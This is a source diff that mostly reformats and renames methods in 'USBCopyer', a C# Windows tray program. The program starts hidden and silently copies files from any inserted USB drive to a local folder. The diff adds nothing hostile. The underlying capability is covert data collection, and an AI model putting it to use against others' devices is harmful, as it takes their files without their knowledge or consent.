@@ -7,27 +7,26 @@ using System.Management;
 using System.Threading;
 using System.Diagnostics;
 using System.Linq;
-using System.ComponentModel;
 using System.Text;
 
 namespace USBCopyer
 {
     public partial class Host : Form
     {
-        public string title   = Application.ProductName;
-        public static string dir     = Application.StartupPath + @"\USBCopyerData\";
+        public string title = Application.ProductName;
+        public static string dir = Application.StartupPath + @"\USBCopyerData\";
         public static string confdir = Application.StartupPath + @"\USBCopyerData\USBCopyerSystem\";
         public string[] white;
         public string[] black;
         public string[] blackdisk;
         public string[] blackid;
-        public Dictionary<string,Thread> copyThread = new Dictionary<string,Thread>(); //正在复制文件的线程 分区号=>线程
+        public Dictionary<string, Thread> copyThread = new Dictionary<string, Thread>(); //正在复制文件的线程 分区号=>线程
 
         public Host()
         {
             InitializeComponent();
             Hide();
-            setIconX(iconStatus.free);
+            SetIconX(IconStatus.free);
             if (!string.IsNullOrEmpty(Properties.Settings.Default.dir))
             {
                 dir = Properties.Settings.Default.dir + "\\";
@@ -76,55 +75,56 @@ namespace USBCopyer
             if (!string.IsNullOrEmpty(Properties.Settings.Default.white))
             {
                 white = Properties.Settings.Default.white.Split(',');
-            } else
+            }
+            else
             {
                 white = new string[0];
             }
             nicon.Visible = Program.showicon;
-            if(!Properties.Settings.Default.multirun)
+            if (!Properties.Settings.Default.multirun)
             {
-                Process[] processcollection = Process.GetProcessesByName(Application.ProductName);
+                var processcollection = Process.GetProcessesByName(Application.ProductName);
                 if (processcollection.Length >= 2)
                 {
-                    msg("已经有一个 USBCopyer 实例在运行中！本实例即将退出。如果您需要多重运行本程序，请在设置中打开 \"允许多重运行\" 开关", ToolTipIcon.Error);
+                    Msg("已经有一个 USBCopyer 实例在运行中！本实例即将退出。如果您需要多重运行本程序，请在设置中打开 \"允许多重运行\" 开关", ToolTipIcon.Error);
                     Thread.Sleep(3000);
                     Environment.Exit(9);
                 }
             }
-            if(Properties.Settings.Default.firstrun)
+            if (Properties.Settings.Default.firstrun)
             {
-                msg("欢迎使用 USBCopyer V" + Application.ProductVersion + "! 右键单击此图标可进行设置");
+                Msg("欢迎使用 USBCopyer V" + Application.ProductVersion + "! 右键单击此图标可进行设置");
                 Properties.Settings.Default.firstrun = false;
                 Properties.Settings.Default.Save();
             }
         }
 
-        protected override void SetVisibleCore(bool value)
-        {
+        protected override void SetVisibleCore(bool value) =>
             base.SetVisibleCore(value);
-        }
 
-        public delegate void setIconInvoke(iconStatus v);
-        public void setIcon(iconStatus v)
+
+        public delegate void setIconInvoke(IconStatus v);
+        public void SetIcon(IconStatus v)
         {
-            setIconInvoke i = new setIconInvoke(setIconX);
+            var i = new setIconInvoke(SetIconX);
             Invoke(i, v);
         }
 
-        public enum iconStatus { working, free };
-        public void setIconX(iconStatus v)
+        public enum IconStatus { working, free };
+        public void SetIconX(IconStatus v)
         {
-            if (v == iconStatus.free)
+            if (v == IconStatus.free)
             {
-                nicon.Text = title + " V" + Application.ProductVersion + "\r\n状态: 空闲";
+                nicon.Text = $"{title} V{Application.ProductVersion}\r\n状态: 空闲";
+
                 nicon.Icon = Icon = Properties.Resources.icon_small;
                 EnableToolStripMenuItem.Enabled = EnableToolStripMenuItem.Checked = true;
                 EnableToolStripMenuItem.Text = "已启用 (&E)";
                 KillCopyThreadStripMenuItem.Enabled = false;
             }
-            else if (v == iconStatus.working)
+            else if (v == IconStatus.working)
             {
-                nicon.Text = title + "\r\n状态: 正在工作，共 " + copyThread.Count + " 个存储设备";
+                nicon.Text = $"{title}\r\n状态: 正在工作，共{copyThread.Count}个存储设备";
                 nicon.Icon = Icon = Properties.Resources.working_small;
                 EnableToolStripMenuItem.Text = "正在工作 (&E)";
                 EnableToolStripMenuItem.Enabled = false;
@@ -132,9 +132,10 @@ namespace USBCopyer
             }
         }
 
-        public void msg(string str, string t = "", ToolTipIcon msgtype = ToolTipIcon.Info)
+        public void Msg(string str, string t = "", ToolTipIcon msgtype = ToolTipIcon.Info)
         {
-            string tit = string.IsNullOrEmpty(t) ? title : title + " - " + t;
+            var tit = string.IsNullOrEmpty(t) ? title : title + " - " + t;
+
             if (nicon.Visible && !Properties.Settings.Default.hidemsg)
             {
                 nicon.ShowBalloonTip(1000, tit, str, msgtype);
@@ -142,21 +143,21 @@ namespace USBCopyer
             Program.log(tit + "：" + str);
         }
 
-        public void msg(string str, ToolTipIcon msgtype)
+        public void Msg(string str, ToolTipIcon msgtype)
         {
-            msg(str, "", msgtype);
+            Msg(str, "", msgtype);
         }
 
-        public void error(string msg, string title = "错误")
+        public void Error(string msg, string title = "错误")
         {
-            Program.log(title + "：" + msg.Replace("\r\n", " "),2);
-            if(nicon.Visible)
+            Program.log(title + "：" + msg.Replace("\r\n", " "), 2);
+            if (nicon.Visible)
             {
                 MessageBox.Show(msg, title, MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
         }
 
-        public void success(string msg, string title = "操作完成")
+        public void Success(string msg, string title = "操作完成")
         {
             Program.log(title + "：" + msg.Replace("\r\n", " "));
             if (nicon.Visible)
@@ -184,7 +185,8 @@ namespace USBCopyer
             {
                 int wp = m.WParam.ToInt32();
                 //存储设备插/拔/弹
-                if (wp == DBT_DEVICEARRIVAL || wp == DBT_DEVICEQUERYREMOVE || wp == DBT_DEVICEREMOVECOMPLETE || wp == DBT_DEVICEREMOVEPENDING) {
+                if (wp == DBT_DEVICEARRIVAL || wp == DBT_DEVICEQUERYREMOVE || wp == DBT_DEVICEREMOVECOMPLETE || wp == DBT_DEVICEREMOVEPENDING)
+                {
                     DEV_BROADCAST_HDR dbhdr = (DEV_BROADCAST_HDR)Marshal.PtrToStructure(m.LParam, typeof(DEV_BROADCAST_HDR));
                     if (dbhdr.dbch_devicetype == 2)
                     {
@@ -193,21 +195,22 @@ namespace USBCopyer
                         {
                             char[] volums = GetVolumes(dbv.dbcv_unitmask);
                             string disk = volums[0].ToString() + ":";
-                            if(wp == DBT_DEVICEARRIVAL) //存储设备插入
+                            if (wp == DBT_DEVICEARRIVAL) //存储设备插入
                             {
                                 try
                                 {
-                                    ManagementObject diskinfo = new ManagementObject("win32_logicaldisk.deviceid=\""+disk+"\"");
+                                    ManagementObject diskinfo = new ManagementObject("win32_logicaldisk.deviceid=\"" + disk + "\"");
                                     string diskser = "";
                                     string diskname = "";
                                     string diskdir;
-                                    object diskserdata  = diskinfo.Properties["VolumeSerialNumber"].Value;
+                                    object diskserdata = diskinfo.Properties["VolumeSerialNumber"].Value;
                                     object disknamedata = diskinfo.Properties["VolumeName"].Value;
                                     //DiskDetectedCallback
                                     if (Properties.Settings.Default.EnableDiskDetectedCallback && File.Exists(confdir + "DiskDetectedCallback.bat"))
                                     {
                                         int ExitCode = 1;
-                                        Thread th = new Thread(() => {
+                                        Thread th = new Thread(() =>
+                                        {
                                             try
                                             {
                                                 string CallbackCode = File.ReadAllText(confdir + "DiskDetectedCallback.bat");
@@ -228,7 +231,7 @@ namespace USBCopyer
                                         if (Properties.Settings.Default.WaitCallback)
                                         {
                                             th.Join();
-                                            if(ExitCode != 0)
+                                            if (ExitCode != 0)
                                             {
                                                 Program.log("根据 DiskDetectedCallback 回调退出码: " + ExitCode + " 复制操作取消。", 0);
                                             }
@@ -270,13 +273,13 @@ namespace USBCopyer
                                         }
                                     }
                                     catch (Exception) { }
-                                    if(disknamedata != null)
+                                    if (disknamedata != null)
                                     {
                                         diskname = disknamedata.ToString();
                                     }
                                     if (diskserdata == null)
                                     {
-                                        if(string.IsNullOrEmpty(diskname))
+                                        if (string.IsNullOrEmpty(diskname))
                                         {
                                             diskdir = disk.Substring(0, 1);
                                         }
@@ -284,19 +287,19 @@ namespace USBCopyer
                                         {
                                             diskdir = disk.Substring(0, 1) + " - " + diskname;
                                         }
-                                        msg(disk, "存储设备已插入");
+                                        Msg(disk, "存储设备已插入");
                                         Program.log("获取存储设备序列号失败，文件目录将命名为：" + diskdir);
                                     }
                                     else
                                     {
                                         diskser = diskserdata.ToString();
                                         diskdir = diskser;
-                                        msg(disk + " - " + diskser, "存储设备已插入");
+                                        Msg(disk + " - " + diskser, "存储设备已插入");
                                     }
                                     if (EnableToolStripMenuItem.Checked)
                                     {
                                         //使用黑名单磁盘模式
-                                        if(Properties.Settings.Default.UseBlackDisk)
+                                        if (Properties.Settings.Default.UseBlackDisk)
                                         {
                                             if (!string.IsNullOrEmpty(diskser) && blackid.Contains(diskser))
                                             {
@@ -336,7 +339,7 @@ namespace USBCopyer
                                                     return;
                                                 }
                                             }
-                                            setIcon(iconStatus.working);
+                                            SetIcon(IconStatus.working);
                                             if (Properties.Settings.Default.autorm && Directory.Exists(dir + diskdir))
                                             {
                                                 Program.log("清空输出目录：" + dir + diskdir);
@@ -395,7 +398,7 @@ namespace USBCopyer
                                                 th.Start();
                                             }
                                             //free
-                                            setIcon(iconStatus.free);
+                                            SetIcon(IconStatus.free);
                                             if (string.IsNullOrEmpty(diskser))
                                             {
                                                 Program.log("设备数据复制完成，但由于获取磁盘序列号失败，文件目录命名为：" + diskdir);
@@ -412,17 +415,17 @@ namespace USBCopyer
                                         copyThread[disk].Start();
                                     }
                                 }
-                                catch(Exception ex)
+                                catch (Exception ex)
                                 {
-                                    setIcon(iconStatus.free);
-                                    Program.log("获取插入的存储设备信息失败，复制已取消：" + ex.ToString(),2);
+                                    SetIcon(IconStatus.free);
+                                    Program.log("获取插入的存储设备信息失败，复制已取消：" + ex.ToString(), 2);
                                 }
                             }
                             else  //存储设备拔/弹出
                             {
                                 try
                                 {
-                                    setIcon(iconStatus.free);
+                                    SetIcon(IconStatus.free);
                                     if (copyThread.ContainsKey(disk))
                                     {
                                         if (copyThread[disk].IsAlive)
@@ -431,11 +434,11 @@ namespace USBCopyer
                                             copyThread[disk] = null;
                                         }
                                         copyThread.Remove(disk);
-                                        Program.log("用户弹出了存储设备，强制停止复制：" + disk,1);
+                                        Program.log("用户弹出了存储设备，强制停止复制：" + disk, 1);
                                     }
                                 }
-                                catch (Exception) {}
-                            } 
+                                catch (Exception) { }
+                            }
                         }
                     }
                 }
@@ -451,7 +454,7 @@ namespace USBCopyer
                 .Replace("{$DataDir}", dir);
         }
 
-        private string ProcessCallbackCodeWithDisk(string callbackCode, PropertyDataCollection data,string outputdir)
+        private string ProcessCallbackCodeWithDisk(string callbackCode, PropertyDataCollection data, string outputdir)
         {
             return callbackCode
                 .Replace("{$VolumeSerialNumber}", data["VolumeSerialNumber"].Value.ToString())
@@ -534,7 +537,7 @@ namespace USBCopyer
             try
             {
                 DirectoryInfo info = new DirectoryInfo(sourcePath);
-                if(!Directory.Exists(destinationPath))
+                if (!Directory.Exists(destinationPath))
                 {
                     Directory.CreateDirectory(destinationPath);
                 }
@@ -549,7 +552,7 @@ namespace USBCopyer
                         try
                         {
                             var fi1 = new FileInfo(fsi.FullName);
-                            if(CheckExt(fi1.Extension))
+                            if (CheckExt(fi1.Extension))
                             {
                                 CopyLog += "复制文件：" + fsi.FullName + "\r\n";
                                 if (File.Exists(destName))
@@ -582,13 +585,13 @@ namespace USBCopyer
                                             File.Copy(fsi.FullName, destName);
                                             break;
                                         case 1:
-                                            if(fi1.Length > fileSizeLimit)
+                                            if (fi1.Length > fileSizeLimit)
                                             {
                                                 File.Copy(fsi.FullName, destName);
                                             }
                                             break;
                                         case 2:
-                                            if(fi1.Length < fileSizeLimit)
+                                            if (fi1.Length < fileSizeLimit)
                                             {
                                                 File.Copy(fsi.FullName, destName);
                                             }
@@ -599,14 +602,14 @@ namespace USBCopyer
                         }
                         catch (Exception ex)
                         {
-                            CopyLog +=  "复制文件失败：" + destName + "\r\n" + ex.ToString();
+                            CopyLog += "复制文件失败：" + destName + "\r\n" + ex.ToString();
                         }
                     }
                     else //如果是文件夹，新建文件夹，递归
                     {
                         try
                         {
-                            if(Properties.Settings.Default.SkipEmptyFolder)
+                            if (Properties.Settings.Default.SkipEmptyFolder)
                             {
                                 FileSystemInfo[] subFiles = (new DirectoryInfo(fsi.FullName)).GetFileSystemInfos();
                                 if (subFiles.Count() > 0)
@@ -662,17 +665,17 @@ namespace USBCopyer
 
         public void OpenLogFile()
         {
-            if(!File.Exists(confdir + "EventViewer.xml"))
+            if (!File.Exists(confdir + "EventViewer.xml"))
             {
                 File.WriteAllText(confdir + "EventViewer.xml", Properties.Resources.EventViewer);
             }
             try
             {
-                Process.Start("eventvwr.exe", "/v:\""+confdir + "EventViewer.xml"+"\"");
+                Process.Start("eventvwr.exe", "/v:\"" + confdir + "EventViewer.xml" + "\"");
             }
-           catch (Exception ex)
+            catch (Exception ex)
             {
-                error("打开日志查看器失败：" + ex.ToString());
+                Error("打开日志查看器失败：" + ex.ToString());
             }
         }
 
@@ -699,7 +702,7 @@ namespace USBCopyer
         {
             try
             {
-                if(!Directory.Exists(dir))
+                if (!Directory.Exists(dir))
                 {
                     Directory.CreateDirectory(dir);
                 }
@@ -707,7 +710,7 @@ namespace USBCopyer
             }
             catch (Exception ex)
             {
-                error("打开失败：" + ex.Message);
+                Error("打开失败：" + ex.Message);
             }
         }
 
@@ -719,7 +722,7 @@ namespace USBCopyer
         public void KillEmptyDirectory(String startLocation)
         {
             foreach (var directory in Directory.GetDirectories(startLocation))
-            { 
+            {
                 KillEmptyDirectory(directory);
                 if (Directory.GetFiles(directory).Length == 0 &&
                 Directory.GetDirectories(directory).Length == 0)
@@ -737,7 +740,7 @@ namespace USBCopyer
             }
             catch (Exception ex)
             {
-                error("打开失败：" + ex.Message);
+                Error("打开失败：" + ex.Message);
             }
         }
 
@@ -759,7 +762,7 @@ namespace USBCopyer
             }
             catch (Exception ex)
             {
-                error("打开失败：" + ex.ToString());
+                Error("打开失败：" + ex.ToString());
             }
         }
 
@@ -780,14 +783,14 @@ namespace USBCopyer
 
         private void KillCopyThreadStripMenuItem_Click(object sender, EventArgs e)
         {
-            foreach(KeyValuePair<string,Thread>th in copyThread)
+            foreach (KeyValuePair<string, Thread> th in copyThread)
             {
-                if(th.Value.IsAlive)
+                if (th.Value.IsAlive)
                 {
                     th.Value.Abort();
                 }
             }
-            setIcon(iconStatus.free);
+            SetIcon(IconStatus.free);
         }
 
         private void DiskLogStripMenuItem_Click(object sender, EventArgs e)
@@ -798,7 +801,7 @@ namespace USBCopyer
             }
             catch (Exception ex)
             {
-                error("打开失败：" + ex.ToString());
+                Error("打开失败：" + ex.ToString());
             }
         }
 
@@ -806,11 +809,11 @@ namespace USBCopyer
         {
             try
             {
-                Process.Start("cmd.exe", "/c title Restarting USBCopyer && echo Killing USBCopyer && taskkill /f /pid "+Process.GetCurrentProcess().Id + " && echo Starting USBCopyer && start \"\" \""+Application.ExecutablePath+"\"");
+                Process.Start("cmd.exe", "/c title Restarting USBCopyer && echo Killing USBCopyer && taskkill /f /pid " + Process.GetCurrentProcess().Id + " && echo Starting USBCopyer && start \"\" \"" + Application.ExecutablePath + "\"");
             }
             catch (Exception ex)
             {
-                msg("快速重启失败:\r\n" + ex.Message, ToolTipIcon.Error);
+                Msg("快速重启失败:\r\n" + ex.Message, ToolTipIcon.Error);
             }
         }
 
